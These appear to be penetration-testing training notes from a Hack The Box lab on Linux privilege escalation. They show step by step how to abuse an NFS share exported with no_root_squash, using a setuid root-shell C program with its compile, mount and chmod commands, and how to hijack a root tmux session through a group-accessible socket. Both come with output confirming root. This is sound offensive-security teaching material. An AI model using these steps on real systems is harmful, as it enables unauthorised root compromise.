## Weak NFS Privileges

```shell
3kjS@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
```shell
htb@NIX02:~$ cat /etc/exports
```

```shell
root@Pwnbox:/tmp$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell
root@Pwnbox:/tmp$ gcc shell.c -o shell
```

```shell
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt 
root@Pwnbox:/tmp$ cp shell /mnt 
root@Pwnbox:/tmp$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```shell
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```
## Hijacking Tmux Sessions

```shell
htb@NIX02:~$ tmux -S /shareds new -s debugsess 
htb@NIX02:~$ chown root:devs /shareds
```

Check for any running `tmux` processes.

```shell
htb@NIX02:~$ ps aux | grep tmux
```

Confirm permissions.

```shell
htb@NIX02:~$ ls -la /shareds

srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
```

Review our group membership.

```shell
htb@NIX02:~$ id 

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the `tmux` session and confirm root privileges.

```shell
htb@NIX02:~$ tmux -S /shareds 

id 

uid=0(root) gid=0(root) groups=0(root)
```
